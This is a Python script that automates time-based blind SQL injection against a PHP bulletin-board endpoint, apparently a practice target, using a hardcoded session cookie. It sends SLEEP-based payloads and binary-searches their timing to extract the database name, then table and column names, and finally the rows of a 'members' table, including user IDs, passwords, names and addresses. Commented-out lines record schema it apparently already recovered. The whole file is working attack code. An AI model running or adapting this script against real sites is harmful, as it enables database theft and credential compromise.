import requests
import time
import json
import numpy as np

def http(query):
    URL = "http://normaltic.com:9575/user_board/confirmDel.php"

    headers = {
        "Cookie": "PHPSESSID=g5b7rfm4tuc63ltvi5860jvlsg"
    }

    
    params = {
        "no": query
    }

    start_time = time.time()
    req = requests.get(url=URL, params=params, headers=headers)
    end_time = time.time()

    print("PAYLOAD -> " + query)

    if(end_time - start_time) >= 2:
        return False
    else:
        return True



def binarySearch(min, max, query):
    mid = (min + max)//2
    bresult = http(query + str(mid) + ") and SLEEP(2) and '1'='1")
    if max - min <= 1:
        if bresult:
            return max + 1
        else:
            return min + 1
    
    if bresult:
        return binarySearch(min, mid, query)
    else:
        return binarySearch(mid, max, query)




def finDatabaseName():
    # dbLengthQuery = "313' and (length(database()) > {}) and SLEEP(5) and '1'='1"
    # dbLengthQuery = "test1111' and (length(database()) > {}) and SLEEP(2) and '1'='1"
    dbLengthQuery = "313' and (length(database()) != {}) and SLEEP(5) and '1'='1"
    dbLength = 0
    for i in range(100):
        if http(dbLengthQuery.format(i)):
            dbLength = i
            print("DB Length : " + str(dbLength))
            break

    dbNameQuery = "313' and (ascii(substring((SELECT database()),{},1)) > "
    # dbNameQuery = "test1111' and (ascii(substring((SELECT database()),{},1)) > "
    dbName = ""
    for pos in range(1, dbLength+1):
        dbName += chr(binarySearch(33, 126, dbNameQuery.format(pos)))
    
    print("Database Name : " + dbName)
    return dbName




def findTableName(dbName):
    tableCount = 0
    # tableCountQuery = "308' and (length((SELECT table_name FROM information_schema.tables WHERE table_schema='{}' LIMIT {},1)) > 1) and SLEEP(2) and '1'='1"
    tableCountQuery = "test1111' and (length((SELECT table_name FROM information_schema.tables WHERE table_schema='{}' LIMIT {},1)) > 1) and SLEEP(2) and '1'='1"
    for count in range(100):
        if not http(tableCountQuery.format(dbName, count)):
            continue
        else:
            tableCount = count
            break
    print("Table Count : " + str(tableCount))

    tableLengthList = []
    tableLength = 0
    # dbTableLengthQuery = "308' and (length((SELECT table_name FROM information_schema.tables WHERE table_schema='{}' LIMIT {},1)) > {}) and SLEEP(2) and '1'='1"
    dbTableLengthQuery = "test1111' and (length((SELECT table_name FROM information_schema.tables WHERE table_schema='{}' LIMIT {},1)) > {}) and SLEEP(2) and '1'='1"
    for tableCount in range(tableCount):
        for i in range(100):
            if http(dbTableLengthQuery.format(dbName, tableCount, i)):
                tableLength = i
                print("Table Length : " + str(tableLength))
                tableLengthList.append(i)
                break
    
    print(tableLengthList)

    # tableNameQuery = "308' and (ascii(substring((SELECT table_name FROM information_schema.tables WHERE table_schema='{}' LIMIT {},1),{},1)) > "
    tableNameQuery = "308' and (ascii(substring((SELECT table_name FROM information_schema.tables WHERE table_schema='{}' LIMIT {},1),{},1)) > "
    
    tableList = []
    for i in range(tableCount):
        tableName = ""
        for pos in range(1, tableLengthList[i]+1):
            tableName += chr(binarySearch(33, 126, tableNameQuery.format(dbName, i, pos)))
        tableList.append(tableName)

    print("Table Name : " + str(tableList))
    return tableList





def findColumn(tableName):
    # columnCountQuery = "308' and (length((SELECT column_name FROM information_schema.columns WHERE table_name='{}' LIMIT {},1)) > 1) and SLEEP(2) and '1'='1"
    columnCountQuery = "test1111' and (length((SELECT column_name FROM information_schema.columns WHERE table_name='{}' LIMIT {},1)) > 1) and SLEEP(2) and '1'='1"
    columnCountList = []
    for count in range(len(tableName)):
        for length in range(100):
            if not http(columnCountQuery.format(tableName[count], length)):
                continue
            else:
                columnCountList.append(length)
                break

    print(columnCountList)

    columnLengthList = []
    # columnLengthQuery = "308' and (length((SELECT column_name FROM information_schema.columns WHERE table_name='{}' LIMIT {},1)) > {}) and SLEEP(2) and '1'='1"
    columnLengthQuery = "test1111' and (length((SELECT column_name FROM information_schema.columns WHERE table_name='{}' LIMIT {},1)) > {}) and SLEEP(2) and '1'='1"
    for tableIndex in range(len(tableName)):
        columnLength = []
        for columnCount in range(columnCountList[tableIndex]):
            for i in range(100):
                if http(columnLengthQuery.format(tableName[tableIndex], columnCount, i)):
                    columnLength.append(i)
                    break
        columnLengthList.append(columnLength)

    print(columnLengthList)

    # colNameQuery = "308' and (ascii(substring((SELECT column_name FROM information_schema.columns WHERE table_name='{}' LIMIT {},1),{},1)) > "
    colNameQuery = "test1111' and (ascii(substring((SELECT column_name FROM information_schema.columns WHERE table_name='{}' LIMIT {},1),{},1)) > "
    colList = []
    for i in range(len(columnLengthList)):
        colNameList = []
        for row in range(len(columnLengthList[i])):
            colName = ""
            for pos in range(1, columnLengthList[i][row]+1):
                colName += chr(binarySearch(33, 126, colNameQuery.format(tableName[i], row, pos)))
            colNameList.append(colName)
        print(colNameList)
        colList.append(colNameList)
    
    print("Col Name : " + str(colList))

def findData(colList, tableList):
    # dataCountQuery = "308' and (length((SELECT {} FROM {} LIMIT 0,1)) > {}) and SLEEP(1) and '1'='1"
    dataCountQuery = "test1111' and (length((SELECT {} FROM {} LIMIT 0,1)) > {}) and SLEEP(1) and '1'='1"
    dataCount = []

    colList = ['idx', 'uid', 'pwd', 'name', 'address']
    tableName = "members"

    for colIndex in range(len(colList)):
        for count in range(100):
            if http(dataCountQuery.format(colList[colIndex], tableName, count)):
                dataCount.append(count)
                break
        
    print(dataCount)

    # dataNameQuery = "308' and (ascii(substring((SELECT {} FROM {} LIMIT 0,1),{},1)) > "
    dataNameQuery = "test1111' and (ascii(substring((SELECT {} FROM {} LIMIT 0,1),{},1)) > "
    dataList = []
    for colIndex in range(len(colList)):
        dataName = ""
        for pos in range(1, dataCount[colIndex]+1):
            dataName += chr(binarySearch(33, 126, dataNameQuery.format(colList[colIndex], tableName, pos)))
        print(dataName)
        dataList.append(dataName)

    print(dataList)
   

# dbName = "bbs"
# tableName = ["ask_board", "board", "members"]
# colList = [['no', 'subject', 'name', 'memo', 'phone', 'pwd', 'view', 'up', 'upname', 'date', 'ip'], ['no', 'subject', 'name', 'memo', 'date', 'ip', 'uid', 'pwd', '~~####', '~~~~########', '~~~~~##########', 'path', 'fileName', 'up', 'upname', 'view'], ['idx', 'uid', 'pwd', 'name', 'address']]

dbName = finDatabaseName()
# tableName = findTableName(dbName)
# colList = findColumn(tableName)
# findData(colList, tableName)









